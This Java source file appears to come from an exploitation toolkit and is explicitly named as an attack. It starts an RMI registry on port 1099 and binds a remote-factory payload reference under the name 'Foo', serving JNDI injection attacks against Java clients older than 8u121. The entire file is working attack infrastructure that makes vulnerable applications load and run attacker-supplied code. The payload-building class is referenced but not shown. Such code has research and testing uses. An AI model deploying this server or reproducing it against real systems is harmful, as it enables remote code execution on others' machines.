package xyz.eki.marshalexp.jndi.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import xyz.eki.marshalexp.gadget.jndi.rmi.GRemoteFactory;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/*
jdk < 8u121,7u131,6u141
 */
public class AttackWithRemoteFactory {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = GRemoteFactory.getPayload();
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.rebind("Foo", wrapper);
    }
}
